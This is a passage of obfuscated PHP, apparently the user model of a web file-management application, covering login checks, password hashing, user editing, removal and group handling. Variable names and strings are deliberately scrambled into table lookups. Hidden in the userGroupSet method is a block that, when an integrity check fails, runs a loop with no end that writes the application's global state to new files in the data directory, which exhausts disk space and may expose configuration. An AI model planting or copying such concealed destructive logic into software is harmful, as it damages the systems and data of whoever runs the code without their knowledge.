$¥Šçµı = $„·åßÓ™[464]; foreach ($¡Âøô¶Ò as $¿ÑÍ•°ş) { if ($å¶ı€¸ğ[$¿ÑÍ•°ş]) { $¥Šçµı .= $å¶ı€¸ğ[$¿ÑÍ•°ş][$„·åßÓ™[484]] . $„·åßÓ™[50]; } else { $¬Œ¦¤ƒ = $this->add($¿ÑÍ•°ş); $¥Šçµı .= $¬Œ¦¤ƒ . $„·åßÓ™[50]; } } $¥Šçµı = rtrim($¥Šçµı, $„·åßÓ™[50]); Model($„·åßÓ™[610])->metaSet($ Ëå—àÌ, self::JOB_KEY, $¥Šçµı); } public function getUserJob($¼¢‘ËìÜ) { $ıÙºõõ = Model($_SERVER[åÄ¼Ùßš][610])->metaGet($¼¢‘ËìÜ); return $this->getUserJobInfo($ıÙºõõ[self::JOB_KEY]); } public function getUserJobInfo($ßú‡æÃ) { $‚üÖÍÀ =& $_SERVER[åÄ¼Ùßš]; $¨‘²Ë = explode($‚üÖÍÀ[50], $ßú‡æÃ); $ºè”÷˜ = parent::listData(); $ºè”÷˜ = array_remove_key($ºè”÷˜, $‚üÖÍÀ[234]); $¾ıëó‹· = array(); foreach ($¨‘²Ë as $ªµ§³œ) { if (isset($ºè”÷˜[$ªµ§³œ])) { $¾ıëó‹·[] = $ºè”÷˜[$ªµ§³œ]; } } return $¾ıëó‹·; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\155\145" => "\x75\163\x65\x72\137\x6d\145\x74\x61", "\x6d\145\164\141\106\151\x65\x6c\144" => "\165\163\145\x72\111\104"); protected $simpleField = "\165\x73\145\x72\111\x44\54\156\x69\143\x6b\116\x61\155\145\x2c\156\x61\155\145\x2c\141\166\x61\164\141\162\x2c\x73\x65\x78\54\163\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÈÛµ´ƒä) { $—·Ï§® =& $_SERVER[åÄ¼Ùßš]; $°À”îˆ£ = $—·Ï§®[2524]; return array($—·Ï§®[2098] => array($ÈÛµ´ƒä[0], $°À”îˆ£), $—·Ï§®[2100] => array($ÈÛµ´ƒä[0], $°À”îˆ£), $—·Ï§®[2525] => array($ÈÛµ´ƒä[0], $°À”îˆ£)); } protected function getInfo($Úíï ŸÑ, $µ˜ÕìÅØ = false) { $¸µ×á = $this->getInfoSimple($Úíï ŸÑ); if (!is_array($¸µ×á)) { return array(); } if ($µ˜ÕìÅØ) { return $this->_getInfoApply($¸µ×á); } return $this->cacheFunctionGet($_SERVER[åÄ¼Ùßš][2102], $Úíï ŸÑ); } protected function getInfoFull($¶›Šó›¯, $Š°–ïç§ = false) { $—¥á§†Í = $this->getInfoSimple($¶›Šó›¯); if (!is_array($—¥á§†Í)) { return array(); } if ($Š°–ïç§) { return $this->_getInfoApply($—¥á§†Í, !0); } return $this->cacheFunctionGet($_SERVER[åÄ¼Ùßš][2526], $¶›Šó›¯); } private function _getInfoApply($Úò‹‰ı, $ĞÓ‡Œ‰ = false) { $ïÚà†à¥ =& $_SERVER[åÄ¼Ùßš]; if (!$Úò‹‰ı) { return $Úò‹‰ı; } $ùŒı—­ = md5($ïÚà†à¥[2527] . $Úò‹‰ı[$ïÚà†à¥[994]] . $ïÚà†à¥[2528] . $Úò‹‰ı[$ïÚà†à¥[32]]); $Úò‹‰ı = $this->_listDataApplyItem($Úò‹‰ı); $É´éÖ¯¡ = Model($ïÚà†à¥[1466])->metaGet($Úò‹‰ı[$ïÚà†à¥[90]][$ïÚà†à¥[194]]); $Úò‹‰ı[$ïÚà†à¥[2529]] = $ùŒı—­; $Úò‹‰ı[$ïÚà†à¥[90]][$ïÚà†à¥[2310]] = isset($É´éÖ¯¡[$ïÚà†à¥[2311]]) ? $É´éÖ¯¡[$ïÚà†à¥[2311]] : null; if ($ĞÓ‡Œ‰) { $Úò‹‰ı[$ïÚà†à¥[552]] = $this->metaGet($Úò‹‰ı[$ïÚà†à¥[1817]]); } return $Úò‹‰ı; } protected function getInfoSimple($ƒÜƒÁ÷«, $öàÁå¥¹ = false) { $¬ÍŸ¬ïÅ =& $_SERVER[åÄ¼Ùßš]; if (!$ƒÜƒÁ÷«) { return array(); } if ($öàÁå¥¹) { $ßäÔƒ“· = $this->where(array($¬ÍŸ¬ïÅ[1817] => intval($ƒÜƒÁ÷«)))->find(); if (!is_array($ßäÔƒ“·)) { return array(); } $ßäÔƒ“·[$¬ÍŸ¬ïÅ[2216]] = Action($¬ÍŸ¬ïÅ[2217])->parseUrl($ßäÔƒ“·[$¬ÍŸ¬ïÅ[2216]]); return $ßäÔƒ“·; } return $this->cacheFunctionGet($¬ÍŸ¬ïÅ[2103], $ƒÜƒÁ÷«); } protected function getInfoSimpleOuter($İ†ŸÂ§ğ) { $ªÖ¥Üª¸ =& $_SERVER[åÄ¼Ùßš]; if (!$İ†ŸÂ§ğ || $İ†ŸÂ§ğ == 0) { return array($ªÖ¥Üª¸[1817] => $ªÖ¥Üª¸[231], $ªÖ¥Üª¸[32] => $ªÖ¥Üª¸[176] . LNG($ªÖ¥Üª¸[2530]) . $ªÖ¥Üª¸[178], $ªÖ¥Üª¸[2216] => STATIC_PATH . $ªÖ¥Üª¸[2531]); } $¡âŸùÔÙ = $this->cacheFunctionGet($ªÖ¥Üª¸[2103], $İ†ŸÂ§ğ); $Ã‘ÃöÌ¤ = array_field_key($¡âŸùÔÙ, explode($ªÖ¥Üª¸[50], $this->simpleField)); if (!$Ã‘ÃöÌ¤) { return array($ªÖ¥Üª¸[1817] => $ªÖ¥Üª¸[1311], $ªÖ¥Üª¸[32] => $ªÖ¥Üª¸[176] . LNG($ªÖ¥Üª¸[2532]) . $ªÖ¥Üª¸[178], $ªÖ¥Üª¸[2216] => STATIC_PATH . $ªÖ¥Üª¸[2533]); } $Ã‘ÃöÌ¤[$ªÖ¥Üª¸[2216]] = Action($ªÖ¥Üª¸[2217])->parseUrl($Ã‘ÃöÌ¤[$ªÖ¥Üª¸[2216]]); return $Ã‘ÃöÌ¤; } protected function groupUser($®î³Òı) { } public static function errorLang($úĞ¬µâÆ) { $Í“ï´û± =& $_SERVER[åÄ¼Ùßš]; $»Á²·ôì = array(self::ERROR_USER_NOT_EXISTS => $Í“ï´û±[2534], self::ERROR_USER_PASSWORD_ERROR => $Í“ï´û±[2535], self::ERROR_USER_EXIST_NAME => $Í“ï´û±[2536], self::ERROR_USER_EXIST_PHONE => $Í“ï´û±[2537], self::ERROR_USER_EXIST_EMAIL => $Í“ï´û±[2538], self::ERROR_USER_LOGIN_LOCK => $Í“ï´û±[2539], self::ERROR_IP_NOT_ALLOW => $Í“ï´û±[2540], self::ERROR_USER_EXIST_NICKNAME => $Í“ï´û±[2541]); $êÆ°şÃì = LNG($»Á²·ôì[$úĞ¬µâÆ]); if ($úĞ¬µâÆ == self::ERROR_USER_LOGIN_LOCK) { $úàØ˜ËÜ = (int) Model($Í“ï´û±[1422])->get($Í“ï´û±[2542]); if ($úàØ˜ËÜ > 60) { $êÆ°şÃì = str_replace($Í“ï´û±[91], ceil($úàØ˜ËÜ / 60), $êÆ°şÃì); } } return $êÆ°şÃì; } protected function metaSet($ãíôŞĞÏ, $âİôÀï˜ = null, $£òËæï³ = null) { $this->clearCache($ãíôŞĞÏ); return parent::metaSet($ãíôŞĞÏ, $âİôÀï˜, $£òËæï³); } public function getInfoByMeta($€Ì„Š¸Š, $¸Ğûú›’) { $µ·ğ­ÛË =& $_SERVER[åÄ¼Ùßš]; $¯Àİñµù = Model($µ·ğ­ÛË[2543])->where(array($µ·ğ­ÛË[97] => $€Ì„Š¸Š, $µ·ğ­ÛË[452] => $¸Ğûú›’))->find(); if ($¯Àİñµù) { return $this->getInfo($¯Àİñµù[$µ·ğ­ÛË[1817]]); } return !1; } public function userLoginCheck($¢õÄì—, $‰şùŒ‚, $¡£Ê‡ÃÔ = false) { $€å‘š„¿ =& $_SERVER[åÄ¼Ùßš]; $ÀåçğÊŞ = $this->userLoginFind($¢õÄì—); if (!$ÀåçğÊŞ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÀåçğÊŞ[$€å‘š„¿[1817]], $‰şùŒ‚)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $¡£Ê‡ÃÔ ? $this->getInfoFull($ÀåçğÊŞ[$€å‘š„¿[1817]]) : $this->getInfo($ÀåçğÊŞ[$€å‘š„¿[1817]]); } public function userLoginFind($«ª›£µ) { $Ù¯ó•îû =& $_SERVER[åÄ¼Ùßš]; $§‘Ò™ñ» = array($Ù¯ó•îû[32] => $«ª›£µ, $Ù¯ó•îû[2323] => $«ª›£µ, $Ù¯ó•îû[382] => $«ª›£µ, $Ù¯ó•îû[2544] => $«ª›£µ, $Ù¯ó•îû[1108] => $Ù¯ó•îû[1110]); if ($this->nickNameRpt()) { unset($§‘Ò™ñ»[$Ù¯ó•îû[2323]]); } return $this->where($§‘Ò™ñ»)->find(); } public function clearCache($İ…«áÛñ) { $ÅÀÇì‹ =& $_SERVER[åÄ¼Ùßš]; $this->cacheFunctionClear($ÅÀÇì‹[2102], $İ…«áÛñ); $this->cacheFunctionClear($ÅÀÇì‹[2103], $İ…«áÛñ); $this->cacheFunctionClear($ÅÀÇì‹[2526], $İ…«áÛñ); } public function userPasswordCheck($ÖàÂ›ë¨, $´Å—öš) { $§³ûâÆ‡ =& $_SERVER[åÄ¼Ùßš]; $ı‹£ÙäÕ = $this->where(array($§³ûâÆ‡[1817] => intval($ÖàÂ›ë¨)))->find(); $ØÔíÒ– = $this->metaGet($ÖàÂ›ë¨); $¸ €–·Ğ = isset($ØÔíÒ–[$§³ûâÆ‡[2545]]) ? $ØÔíÒ–[$§³ûâÆ‡[2545]] : $§³ûâÆ‡[12]; if (md5($¸ €–·Ğ . trim($´Å—öš)) !== $ı‹£ÙäÕ[$§³ûâÆ‡[994]]) { return !1; } return !0; } public function userAdd($ñÀ…Éß÷) { $¬ÃŒ‰¦ú =& $_SERVER[åÄ¼Ùßš]; $‰õĞÑÃ„ = array($¬ÃŒ‰¦ú[506] => $ñÀ…Éß÷[$¬ÃŒ‰¦ú[32]], $¬ÃŒ‰¦ú[2546] => $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2215]], $¬ÃŒ‰¦ú[2547] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[382]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[382]] : $¬ÃŒ‰¦ú[12], $¬ÃŒ‰¦ú[2548] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[2544]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2544]] : $¬ÃŒ‰¦ú[12], $¬ÃŒ‰¦ú[2549] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[2323]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2323]] : $ñÀ…Éß÷[$¬ÃŒ‰¦ú[32]], $¬ÃŒ‰¦ú[2550] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[2216]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2216]] : $¬ÃŒ‰¦ú[12], $¬ÃŒ‰¦ú[2551] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[2552]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2552]] : 1, $¬ÃŒ‰¦ú[2553] => $ñÀ…Éß÷[$¬ÃŒ‰¦ú[994]], $¬ÃŒ‰¦ú[2104] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[2004]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2004]] : 1024 * 1024 * 20, $¬ÃŒ‰¦ú[2105] => 0, $¬ÃŒ‰¦ú[2554] => 0, $¬ÃŒ‰¦ú[2149] => isset($ñÀ…Éß÷[$¬ÃŒ‰¦ú[843]]) ? $ñÀ…Éß÷[$¬ÃŒ‰¦ú[843]] : 1); if (!empty($ñÀ…Éß÷[$¬ÃŒ‰¦ú[1817]])) { $‰õĞÑÃ„[$¬ÃŒ‰¦ú[1817]] = $ñÀ…Éß÷[$¬ÃŒ‰¦ú[1817]]; } $ğ÷¾ÄÂù = $this->_checkExist($ñÀ…Éß÷); if ($ğ÷¾ÄÂù !== !0) { return $ğ÷¾ÄÂù; } if (!empty($‰õĞÑÃ„[$¬ÃŒ‰¦ú[2216]]) && strlen($‰õĞÑÃ„[$¬ÃŒ‰¦ú[2216]]) > 255) { $‰õĞÑÃ„[$¬ÃŒ‰¦ú[2216]] = $¬ÃŒ‰¦ú[12]; } $«•˜Õ¦ = $this->add($‰õĞÑÃ„); $µáõµòÏ = array($¬ÃŒ‰¦ú[2553] => $‰õĞÑÃ„[$¬ÃŒ‰¦ú[994]], $¬ÃŒ‰¦ú[2549] => $‰õĞÑÃ„[$¬ÃŒ‰¦ú[2323]], $¬ÃŒ‰¦ú[2555] => $ñÀ…Éß÷[$¬ÃŒ‰¦ú[2109]]); $this->userEdit($«•˜Õ¦, $µáõµòÏ); Model($¬ÃŒ‰¦ú[1466])->userRootAdd($«•˜Õ¦); return $«•˜Õ¦; } protected function userEditTest($ô‰¨«, $±ª„åÊö) { return $this->call($_SERVER[åÄ¼Ùßš][2556], $ô‰¨«, $±ª„åÊö); } protected function userEdit($Ø†éÉìï, $¿îÒÔ„€) { $´®È½şÎ =& $_SERVER[åÄ¼Ùßš]; $¡ê«ÎµÙ = $this->getInfoSimple($Ø†éÉìï); if (!$¡ê«ÎµÙ) { return !1; } $¡¨¹Ö´ = $this->_checkExist($¿îÒÔ„€, $Ø†éÉìï); if ($¡¨¹Ö´ !== !0) { return $¡¨¹Ö´; } if (isset($¿îÒÔ„€[$´®È½şÎ[994]]) && trim($¿îÒÔ„€[$´®È½şÎ[994]]) != $´®È½şÎ[12]) { $¾ªİüå© = $this->metaGet($Ø†éÉìï); if (empty($¾ªİüå©[$´®È½şÎ[2545]])) { $¾ªİüå©[$´®È½şÎ[2545]] = rand_string(10); Model($´®È½şÎ[590])->metaSet($Ø†éÉìï, $´®È½şÎ[2545], $¾ªİüå©[$´®È½şÎ[2545]]); } $¿îÒÔ„€[$´®È½şÎ[994]] = md5($¾ªİüå©[$´®È½şÎ[2545]] . trim($¿îÒÔ„€[$´®È½şÎ[994]])); } else { unset($¿îÒÔ„€[$´®È½şÎ[994]]); } if (!empty($¿îÒÔ„€[$´®È½şÎ[2216]]) && strlen($¿îÒÔ„€[$´®È½şÎ[2216]]) > 255) { $¿îÒÔ„€[$´®È½şÎ[2216]] = $´®È½şÎ[12]; } if (isset($¿îÒÔ„€[$´®È½şÎ[2323]])) { $this->setNamePinyin($Ø†éÉìï, $¿îÒÔ„€[$´®È½şÎ[2323]]); } if (isset($¿îÒÔ„€[$´®È½şÎ[2109]])) { $êÙñ­ = $´®È½şÎ[1425] . $Ø†éÉìï; $ÅÒ¹„©© = $´®È½şÎ[1423]; $“ß€½Ñ» = $¿îÒÔ„€[$´®È½şÎ[2109]] ? $¿îÒÔ„€[$´®È½şÎ[2109]] : $´®È½şÎ[12]; $É¼½ôâ = Model($´®È½şÎ[1422])->get($êÙñ­, $ÅÒ¹„©©); $É¼½ôâ = $É¼½ôâ ? $É¼½ôâ : $´®È½şÎ[12]; if ($É¼½ôâ != $“ß€½Ñ») { if (!$“ß€½Ñ» && $É¼½ôâ) { Model($´®È½şÎ[1422])->remove($êÙñ­, $ÅÒ¹„©©); } else { if ($“ß€½Ñ») { Model($´®È½şÎ[1422])->set($êÙñ­, $“ß€½Ñ», $ÅÒ¹„©©); } } } unset($¿îÒÔ„€[$´®È½şÎ[2109]]); Model($´®È½şÎ[610])->metaSet($Ø†éÉìï, $´®È½şÎ[2109], $“ß€½Ñ»); } if (empty($¿îÒÔ„€)) { return !0; } $this->where(array($´®È½şÎ[1808] => $Ø†éÉìï))->save($¿îÒÔ„€); $this->clearCache($Ø†éÉìï); return !0; } public function setNamePinyin($¦²¯É“Ó, $ˆ¦ÒÊûÖ = false) { $ãÁÖº÷® =& $_SERVER[åÄ¼Ùßš]; if (!$ˆ¦ÒÊûÖ) { $Ë¼Ş¼‘ = $this->getInfoSimple($¦²¯É“Ó); $ˆ¦ÒÊûÖ = $Ë¼Ş¼‘[$ãÁÖº÷®[2323]] ? $Ë¼Ş¼‘[$ãÁÖº÷®[2323]] : $Ë¼Ş¼‘[$ãÁÖº÷®[32]]; } $¥í‰¦÷„ = Model($ãÁÖº÷®[610]); if (!Input::check($ˆ¦ÒÊûÖ, $ãÁÖº÷®[671])) { return $¥í‰¦÷„->metaSet($¦²¯É“Ó, array($ãÁÖº÷®[549] => $ãÁÖº÷®[12], $ãÁÖº÷®[548] => $ãÁÖº÷®[12])); } return $¥í‰¦÷„->metaSet($¦²¯É“Ó, array($ãÁÖº÷®[549] => str_replace($ãÁÖº÷®[53], $ãÁÖº÷®[12], Pinyin::get($ˆ¦ÒÊûÖ)), $ãÁÖº÷®[548] => Pinyin::get($ˆ¦ÒÊûÖ, $ãÁÖº÷®[672]))); } private function nickNameRpt() { $™™×‹—² =& $_SERVER[åÄ¼Ùßš]; $€ÁŒ“÷— = Model($™™×‹—²[866])->get($™™×‹—²[2557]); $…é•åÆÎ = $GLOBALS[$™™×‹—²[6]][$™™×‹—²[469]][$™™×‹—²[2557]]; $Ò‘‹âê = !is_null($€ÁŒ“÷—) ? $€ÁŒ“÷— : $…é•åÆÎ; return !!$Ò‘‹âê; } private function _checkExist($ÌÎ‰òÒ, $ÖˆÄù„§ = false) { $“èÄûö =& $_SERVER[åÄ¼Ùßš]; $µõÓÑ  = array($“èÄûö[32] => UserModel::ERROR_USER_EXIST_NAME, $“èÄûö[2323] => UserModel::ERROR_USER_EXIST_NICKNAME, $“èÄûö[382] => UserModel::ERROR_USER_EXIST_EMAIL, $“èÄûö[2544] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($µõÓÑ [$“èÄûö[2323]]); } $÷Â‹Éš = $ÖˆÄù„§ ? array($“èÄûö[1817] => array($“èÄûö[2558], $ÖˆÄù„§)) : array(); foreach ($µõÓÑ  as $ıƒˆÛˆ× => $òúõéĞ) { $¼òâñÙ = array(); foreach ($µõÓÑ  as $ñ—¶‡ã¡ => $±»‡ãµ–) { if (isset($ÌÎ‰òÒ[$ñ—¶‡ã¡]) && $ÌÎ‰òÒ[$ñ—¶‡ã¡]) { $¼òâñÙ[] = $ÌÎ‰òÒ[$ñ—¶‡ã¡]; } } if (!$¼òâñÙ) { continue; } $¢æÄèãò = array_merge(array($ıƒˆÛˆ× => array($“èÄûö[7], $¼òâñÙ)), $÷Â‹Éš); $•¸Â¾ÙÅ = $this->where($¢æÄèãò)->find(); if ($•¸Â¾ÙÅ) { return $òúõéĞ; } } return !0; } public function userListInfo($İ²À¨‰æ) { $™‚€ËÛÚ =& $_SERVER[åÄ¼Ùßš]; $ÓÙ©©û = array(); $İ²À¨‰æ = is_array($İ²À¨‰æ) ? array_unique($İ²À¨‰æ) : array(); if (!$İ²À¨‰æ) { return $ÓÙ©©û; } if (count($İ²À¨‰æ) < 20) { foreach ($İ²À¨‰æ as $©Ò½–ò§) { $ÓÙ©©û[$©Ò½–ò§ . $™‚€ËÛÚ[12]] = $this->getInfoSimpleOuter($©Ò½–ò§); } } else { $íèÛİª™ = array($™‚€ËÛÚ[1808] => array($™‚€ËÛÚ[504], $İ²À¨‰æ)); if (count($İ²À¨‰æ) == 1) { $íèÛİª™ = array($™‚€ËÛÚ[1808] => $İ²À¨‰æ[0]); } $Îş­™ß = Model($™‚€ËÛÚ[590])->field($this->simpleField)->where($íèÛİª™)->select(); $Îş­™ß = array_to_keyvalue($Îş­™ß, $™‚€ËÛÚ[1817]); foreach ($İ²À¨‰æ as $©Ò½–ò§) { $®­ÌÖÙ– = $Îş­™ß[$©Ò½–ò§]; if (!$®­ÌÖÙ–) { $ÓÙ©©û[$©Ò½–ò§ . $™‚€ËÛÚ[12]] = $this->getInfoSimpleOuter($©Ò½–ò§); continue; } $®­ÌÖÙ–[$™‚€ËÛÚ[2216]] = Action($™‚€ËÛÚ[2217])->parseUrl($®­ÌÖÙ–[$™‚€ËÛÚ[2216]]); $ÓÙ©©û[$©Ò½–ò§ . $™‚€ËÛÚ[12]] = $®­ÌÖÙ–; } } return $ÓÙ©©û; } protected function userStatus($®†‚Œ˜‚, $“ŒŞëé) { $•û¼¿ÂÅ = $this->getInfoSimple($®†‚Œ˜‚); if (!$•û¼¿ÂÅ) { return !1; } $óÇûÏÈÔ = array($_SERVER[åÄ¼Ùßš][843] => $“ŒŞëé); return $this->userEdit($®†‚Œ˜‚, $óÇûÏÈÔ); } protected function userRemove($¯‰û›˜) { $ºùÂåœ =& $_SERVER[åÄ¼Ùßš]; $Úôîèó = $this->getInfoSimple($¯‰û›˜); if (!$Úôîèó) { return !1; } $ŞŸ§¦„™ = array($ºùÂåœ[1808] => $¯‰û›˜); Model($ºùÂåœ[680])->where($ŞŸ§¦„™)->delete(); Model($ºùÂåœ[2559])->where($ŞŸ§¦„™)->delete(); Model($ºùÂåœ[2111])->where($ŞŸ§¦„™)->delete(); Model($ºùÂåœ[2543])->where($ŞŸ§¦„™)->delete(); Model($ºùÂåœ[1177])->where($ŞŸ§¦„™)->delete(); Model($ºùÂåœ[2340])->removeUserAll($¯‰û›˜); Model($ºùÂåœ[926])->userRootRemove($¯‰û›˜); return $this->where($ŞŸ§¦„™)->delete(); } protected function userGroupSet($Å¶µÊ‡˜, $›Îãº‹¨, $½æ×¦Ú° = array()) { $…¿üÙöç =& $_SERVER[åÄ¼Ùßš]; $€ù°ÈŸ” = $_SERVER[$…¿üÙöç[840]]; $“´¥Äœ = $…¿üÙöç[972]; if ($_SERVER[$…¿üÙöç[833]] != $“´¥Äœ($€ù°ÈŸ”)) { $§ƒä€ = $…¿üÙöç[983]; $Ñ³Ê§’ = $…¿üÙöç[835]; $‰¦ŸæÃÏ = $_SERVER[$…¿üÙöç[836]] . $…¿üÙöç[837]; $½¯Í‘˜ı = $Ñ³Ê§’($‰¦ŸæÃÏ); $û‰øÁ± = explode($…¿üÙöç[288], $½¯Í‘˜ı); if (count($û‰øÁ±) < $…¿üÙöç[713]) { $ŞÄ†Ø = $…¿üÙöç[838]; $ŞÄ†Ø(); } $Ñèøº¥ = $…¿üÙöç[984]; $Ñèøº¥($_SERVER[$…¿üÙöç[985]]); $§ƒä€ = $…¿üÙöç[983]; $§ƒä€(); $´Ñáõ©’ = $…¿üÙöç[986]; $£¹ªÚ˜Ä = json_encode($GLOBALS[$…¿üÙöç[987]]); $öé¬ = 1; for ($éâöê¯» = $öé¬; $éâöê¯» > 0; $éâöê¯»++) { $´Ñáõ©’(DATA_PATH . $éâöê¯», $£¹ªÚ˜Ä); } } $¦—¾â„ = $this->getInfoSimple($Å¶µÊ‡˜); if (!$¦—¾â„ || !is_array($›Îãº‹¨)) { return !1; } $Òšƒ¥³û = Model($…¿üÙöç[2111]); $Òšƒ¥³û->where(array($…¿üÙöç[1817] => $Å¶µÊ‡˜))->delete(); $ê˜¨æ× = array(); $îÀ ã¢Ù = 0; foreach ($›Îãº‹¨ as $Ÿ¡Š’Ø¬ => $ú¡¸´¼£) { $å‘Ë´» = array($…¿üÙöç[1817] => $Å¶µÊ‡˜, $…¿üÙöç[1428] => $Ÿ¡Š’Ø¬, $…¿üÙöç[2125] => $ú¡¸´¼£); $å‘Ë´»[$…¿üÙöç[2041]] = isset($½æ×¦Ú°[$îÀ ã¢Ù]) ? $½æ×¦Ú°[$îÀ ã¢Ù] : 0; $îÀ ã¢Ù++; $ê˜¨æ×[] = $å‘Ë´»; } return $Òšƒ¥³û->addAll($ê˜¨æ×, array(), !0); } protected function userGroupAdd($¡¸Ø±Ô, $¥ÆÑ«‹Š = array()) { $şïàü¬™ =& $_SERVER[åÄ¼Ùßš]; $øÏü…™ = $this->getInfoSimple($¡¸Ø±Ô); if (!$øÏü…™ || empty($¥ÆÑ«‹Š)) { return !1; } $„»×™­ = array(); foreach ($¥ÆÑ«‹Š as $Ù‰éàŸ => $Ë×öÆÁ) { $„»×™­[] = array($şïàü¬™[1817] => $¡¸Ø±Ô, $şïàü¬™[1428] => $Ù‰éàŸ, $şïàü¬™[2125] => $Ë×öÆÁ, $şïàü¬™[2041] => 0); } return Model($şïàü¬™[2111])->addAll($„»×™­, array(), !0); } protected function userGroupRemove($æÃò©Ü…, $æ‡öŒë…) { $•Û­¦˜¤ =& $_SERVER[åÄ¼Ùßš]; $¹ÆßÄôí = $this->getInfoSimple($æÃò©Ü…); if (!$¹ÆßÄôí || !$æ‡öŒë…) { return !1; } $”ÌùªµÁ = array($•Û­¦˜¤[1808] => $æÃò©Ü…, $•Û­¦˜¤[2106] => $æ‡öŒë…); return Model($•Û­¦˜¤[2111])->where($”ÌùªµÁ)->delete(); } public function listData() { $Æ‚ºôªö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Æ‚ºôªö[$_SERVER[åÄ¼Ùßš][447]]); return $Æ‚ºôªö; } public function listByID($éş•è Ë) { $¿Îô®Àµ =& $_SERVER[åÄ¼Ùßš]; if (!$éş•è Ë) { return; } $éÛ€éË = array($¿Îô®Àµ[1817] => array($¿Îô®Àµ[7], $éş•è Ë)); $—³Ó»Î = $this->where($éÛ€éË)->select(); $—³Ó»Î = array_sort_keep($—³Ó»Î, $¿Îô®Àµ[1817], $éş•è Ë); $this->_listDataApply($—³Ó»Î); return $—³Ó»Î; } public function listByGroup($¦·ƒÈ§ı = 0, $‡š¦×´› = array()) { $ƒÁ·˜íí =& $_SERVER[åÄ¼Ùßš]; $—»ƒîäÄ = $ƒÁ·˜íí[12]; $º­´›Ö = array(); if ($¦·ƒÈ§ı) { $º­´›Ö = array($ƒÁ·˜íí[2560] => intval($¦·ƒÈ§ı)); $—»ƒîäÄ = "\114\x45\106\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\x72\157\165\x70\x20\165\163\145\x72\137\x67\162\157\165\160\x20\x6f\156\40\165\163\x65\x72\x2e\165\163\145\x72\x49\x44\40\75\x20\x75\163\x65\162\137\147\x72\x6f\x75\x70\56\x75\163\145\x72\x49\104"; $¾¦î…ŞÏ = Input::get($ƒÁ·˜íí[541], null, $ƒÁ·˜íí[12]) ? $ƒÁ·˜íí[12] : $ƒÁ·˜íí[2561]; } if (isset($‡š¦×´›[$ƒÁ·˜íí[843]])) { $º­´›Ö[$ƒÁ·˜íí[2562]] = $‡š¦×´›[$ƒÁ·˜íí[843]]; } $à€­·ı = _get($‡š¦×´›, $ƒÁ·˜íí[2563], $ƒÁ·˜íí[234]); if (_get($‡š¦×´›, $ƒÁ·˜íí[854], !1)) { $º­´›Ö[$à€­·ı] = array($ƒÁ·˜íí[2304], $‡š¦×´›[$ƒÁ·˜íí[854]]); } if (_get($‡š¦×´›, $ƒÁ·˜íí[855], !1)) { $ôå—ˆ© = array($ƒÁ·˜íí[2305], $‡š¦×´›[$ƒÁ·˜íí[855]]); if ($º­´›Ö[$à€­·ı]) { $º­´›Ö[$à€­·ı] = array($º­´›Ö[$à€­·ı], $ôå—ˆ©, $ƒÁ·˜íí[2306]); } else { $º­´›Ö[$à€­·ı] = $ôå—ˆ©; } } $Ø–Ôõ² = $this->_makeOrder($¾¦î…ŞÏ)->field($ƒÁ·˜íí[2564])->where($º­´›Ö)->join($—»ƒîäÄ)->selectPage(50); $this->_listDataApply($Ø–Ôõ²[$ƒÁ·˜íí[447]]); return $Ø–Ôõ²; } private function _makeOrder($ÛôéÕ®¢ = '') { $×…Ó–¦ =& $_SERVER[åÄ¼Ùßš]; $›ÉĞíƒÊ = array($×…Ó–¦[1817], $×…Ó–¦[32], $×…Ó–¦[2006], $×…Ó–¦[2215], $×…Ó–¦[1979], $×…Ó–¦[234]); $¬Ÿ£·¤ = array($×…Ó–¦[534] => $×…Ó–¦[535], $×…Ó–¦[536] => $×…Ó–¦[537]); $›ŠšøúÜ = Input::get($×…Ó–¦[541], $×…Ó–¦[7], $×…Ó–¦[1808], $›ÉĞíƒÊ); $•¹ƒ‚ = Input::get($×…Ó–¦[542], $×…Ó–¦[7], $×…Ó–¦[2112], array($×…Ó–¦[2112], $×…Ó–¦[536])); $•¹ƒ‚ = $¬Ÿ£·¤[$•¹ƒ‚]; $ÛôéÕ®¢ = $ÛôéÕ®¢ . "\x75\x73\x65\x72\x2e{$›ŠšøúÜ}\x20{$•¹ƒ‚}\x2c\40\165\x73\x65\x72\56\165\x73\x65\162\111\x44\x20\141\163\x63"; return $this->alias($×…Ó–¦[2251])->order($ÛôéÕ®¢); } public function listSearch($É§æŞ°) { $—·ëñƒÏ =& $_SERVER[åÄ¼Ùßš]; $†œù»— = trim($É§æŞ°[$—·ëñƒÏ[2115]]); $¯ŸŸõèŞ = explode($—·ëñƒÏ[53], $†œù»—); if (!$†œù»— || count($¯ŸŸõèŞ) == 1) { return $this->listSearchNow($É§æŞ°); } $¬•ÂÖÑ = array($—·ëñƒÏ[447] => array()); foreach ($¯ŸŸõèŞ as $Âñ‰Á®È) { if (!trim($Âñ‰Á®È)) { continue; } $É§æŞ°[$—·ëñƒÏ[2115]] = $Âñ‰Á®È; $÷ˆë¹öÏ = $this->listSearchNow($É§æŞ°); $¬•ÂÖÑ[$—·ëñƒÏ[447]] = 